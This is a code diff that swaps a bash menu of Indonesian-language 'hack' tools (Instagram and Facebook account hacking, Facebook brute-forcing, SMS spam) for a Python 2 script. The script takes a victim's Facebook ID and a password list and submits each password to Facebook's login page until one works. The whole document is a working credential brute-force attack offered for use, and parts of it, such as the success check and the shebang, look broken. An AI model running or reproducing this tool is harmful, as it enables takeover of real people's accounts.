@@ -1,94 +1,100 @@
-n#!/bin/bash
-#version 1.0
+#!usr/bin/python
 
-clear
-# Variables
-b='\033[1m'
-u='\033[4m'
-bl='\E[30m'
-r='\E[31m'
-g='\E[32m'
-bu='\E[34m'
-m='\E[35m'
-c='\E[36m'
-w='\E[37m'
-endc='\E[0m'
-enda='\033[0m'
-blue='\e[1;34m'
-cyan='\e[1;36m'
-red='\e[1;31m'
-
-cowsay -f eyes "Maestro" | lolcat
-figlet -f slant "Maestro" | lolcat
-echo "    <=====================[]====================>" | lolcat
-echo "    <=====[       Tools By Maestro        ]=====>" | lolcat
-echo  "    <=====[  FB Me : MAESTRO           ]=====>" | lolcat
-echo "    <=====================[]====================>" | lolcat
-
-sleep 1
-
-###################################################
-# CTRL + C
-###################################################
-trap ctrl_c INT
-ctrl_c() {
-clear
-clear
-sleep 1
-exit
-}
+import sys
+import random
+import mechanize
+import cookielib
 
 
-lagi=1
-while [ $lagi -lt 6 ];
-do
-echo ""
-echo $b "1. Hack Akun Instagram${enda}";
-echo $b "2. Hack Akun Facebook${enda}";
-echo $b "3. Multi BruteForce Facebook${enda}";
-echo $b "4. Webdav${enda}";
-echo $b "5. Spam Jd.id${enda}";
-echo $b "6. Tools Installer${enda}";
-echo $b "7. Spam Telkomsel${enda}";
-echo $b "8. Install Bahan${enda}";
-echo $b "99. Exit${enda}";
-read -p " Pilih =>:" pil;
+GHT = '''
+'''
+print "Gunakan Dengan Bijak"
+print "CTRL+C Untuk Keluar"
+print "Thanks To Maestro"
 
-case $pil in
-1) sh Ig.sh
-echo
 
-;;
-2) python2 Fb.py
+email = str(raw_input("[*]=> Masukan ID Korban : "))
+passwordlist = str(raw_input("List Password.txt : "))
 
-;;
-3) python2 uj.py
+useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
 
-;;
-4) sh bh.sh
 
-;;
-5) php fs.php
 
-;;
+login = 'https://www.facebook.com/login.php?login_attempt=1'
+def attack(password):
 
-6) sh fs.sh
+  try:
+     sys.stdout.write("\r => trying %s.. " % password)
+     sys.stdout.flush()
+     br.addheaders = [('User-agent', random.choice(useragents))]
+     site = br.open(login)
+     br.select_form(nr=0)
 
-;;
+      
+         
+     ##Facebook
+     br.form['email'] =email
+     br.form['pass'] = password
+     br.submit()
+     log = br.geturl()
+     if log == login:
+        print "\n\n\n  => Password found .. !!"
+        print "\n  [*] Password => %s\n" % (password)
+        sys.exit(1)
+  except KeyboardInterrupt:
+        print "\n  => Exiting program .. "
+        sys.exit(1)
 
-7) php xc.php
+def search():
+    global password
+    for password in passwords:
+        attack(password.replace("\n",""))
 
-;;
 
-8) sh xd.sh
 
-;;
+def check():
 
-99) echo "Autor : Moreno77" | lolcat
-figlet -f slant "Moreno77" | lolcat
-exit
-;;
+    global br
+    global passwords
+    try:
+       br = mechanize.Browser()
+       cj = cookielib.LWPCookieJar()
+       br.set_handle_robots(False)
+       br.set_handle_equiv(True)
+       br.set_handle_referer(True)
+       br.set_handle_redirect(True)
+       br.set_cookiejar(cj)
+       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+    except KeyboardInterrupt:
+       print "\n[*] Exiting program ..\n"
+       sys.exit(1)
+    try:
+       list = open(passwordlist, "r")
+       passwords = list.readlines()
+       k = 0
+       while k < len(passwords):
+          passwords[k] = passwords[k].strip()
+          k += 1
+    except IOError:
+        print "\n [*] Error: check your password list path \n"
+        sys.exit(1)
+    except KeyboardInterrupt:
+        print "\n [*] Exiting program ..\n"
+        sys.exit(1)
+    try:
+        print GHT
+        print " [*] Account to crack : %s" % (email)
+        print " [*] Loaded :" , len(passwords), "passwords"
+        print " [*] Cracking, please wait ..."
+    except KeyboardInterrupt:
+        print "\n [*] Exiting program ..\n"
+        sys.exit(1)
+    try:
+        search()
+        attack(password)
+    except KeyboardInterrupt:
+        print "\n [*] Exiting program ..\n"
+        sys.exit(1)
 
-esac
-done
-done
+if __name__ == '__main__':
+    check()
